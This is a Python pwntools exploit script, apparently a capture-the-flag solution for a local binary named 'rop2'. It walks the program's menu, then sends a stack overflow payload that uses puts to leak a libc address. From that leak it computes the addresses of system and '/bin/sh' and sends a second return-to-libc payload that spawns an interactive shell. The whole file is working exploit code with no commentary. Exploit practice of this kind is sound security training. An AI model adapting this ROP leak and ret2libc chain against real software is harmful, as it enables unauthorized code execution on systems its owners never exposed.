#-*- coding: utf-8 -*-
from pwn import *

p = process(["./rop2"])

puts_plt = p32(0x08048430) # elf.plt['puts']
puts_got = p32(0x0804a014) # elf.got['puts']
addr_menu = p32(0x080487a0)
offset_puts = 0xf7e7c7e0
offset_system = 0xf7e57310
#addr_system = leak_puts - (offset_puts-offset_system)
offset_binsh = 0xf7f79d4c
#addr_bimsh = leak_puts + (offset_binsh-offset_puts)
popret = p32(0x80483f9)
sleep(0.4)
#pause()


for i in range(0,9) : 
    print p.recv()
    
    p.sendline("1") 
    sleep(0.1)
    p.sendline("1") 
    sleep(0.1)
    p.sendline("0")
    
    print p.recv()
    p.sendline("2")
    sleep(0.1)
    p.sendline("1") 
    sleep(0.1)
    p.sendline("0")


print p.recv()
p.sendline("6")
print p.recv()
payload = "4"
p.sendline(payload)

sleep(0.4)
payload2 = "245687"
p.sendline(payload2)
sleep(0.4)
payload3 = "1"
p.sendline(payload3)
sleep(0.4)
print p.recv()

payload4 = "a"*22 # dummy
payload4 += puts_plt #0x08048430
payload4 += popret   #0x080483f9
payload4 += puts_got #0x0804a014
payload4 += addr_menu #0x080487a0
payload4 += "a"*4 
payload4 += p32(100)

p.sendline(payload4)
#pause()

sleep(0.4)

leaked_puts = u32(p.recv(4))

print hex(leaked_puts)

addr_system = leaked_puts - (offset_puts-offset_system)
addr_binsh = leaked_puts + (offset_binsh-offset_puts)

payload5 = "a"*22
payload5 += p32(addr_system)
payload5 += "a" *4
payload5 += p32(addr_binsh)

sleep(0.4)

p.sendline(payload5)

sleep(0.4)

p.interactive()


